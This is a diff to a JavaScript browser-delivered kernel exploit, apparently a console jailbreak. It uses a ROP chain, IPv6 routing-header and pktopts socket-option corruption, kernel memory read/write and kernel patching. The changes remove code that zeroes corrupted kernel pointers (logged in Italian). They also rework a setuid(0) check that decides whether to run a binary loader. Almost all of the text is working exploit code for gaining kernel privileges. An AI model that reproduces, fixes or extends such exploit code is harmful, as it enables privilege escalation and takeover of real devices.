@@ -142,10 +142,6 @@ const num_clobbers = 8;
 let chain = null;
 var nogc = [];
 
-let m_pktopts2 = null;
-let w_pktopts2 = null;
-
-
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -421,8 +417,6 @@ function set_rthdr(sd, buf, len) {
 function free_rthdrs(sds) {
     for (const sd of sds) {
         setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
-        setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-        setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0);
     }
 }
 
@@ -1475,10 +1469,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      kmem.write64(w_rthdr_p, 0);
      log('corrupt pointers cleaned');
 
-  m_pktopts2=m_pktopts;
-    w_pktopts2=w_pktopts;
-
-    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1616,24 +1606,6 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     localStorage.ExploitLoaded="yes"
     sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
-
-    chain.reset();
-    chain.stack.fill(0);
-
-    try {
-    log("Pulizia puntatori pktopts...");
-    kmem.write64(m_pktopts2.add(0x10), 0); // ip6po_pktinfo
-    kmem.write64(m_pktopts2.add(0x18), 0); // ip6po_nhinfo
-    kmem.write64(m_pktopts2.add(0x68), 0); // ip6po_rthdr
-
-    kmem.write64(w_pktopts2.add(0x10), 0);
-    kmem.write64(w_pktopts2.add(0x18), 0);
-    kmem.write64(w_pktopts2.add(0x68), 0);
-    log("Pulizia pktopts completata.");
-} catch (e) {
-    log(`Errore nel pulire i pktopts: ${e}`);
-}
-
 }
 
 
@@ -1725,19 +1697,26 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
-  try {
-    if (sysi("setuid", 0) == 0) {
-            //  localStorage.ExploitLoaded = "no";
-         runBinLoader();
+   /*  try {
+        chain.sys('setuid', 0);
+        }
+    catch (e) {
+        localStorage.ExploitLoaded = "no";
     }
-  } catch {  }
-    
     
      if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
            runBinLoader();
             return new Promise(() => {});
       }
- 
+ */
+      try {
+    if (sysi("setuid", 0) == 0) {
+      log("Kernel already patched, skipping kexploit");
+       runBinLoader();
+    }
+  } catch {  }
+
+    
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
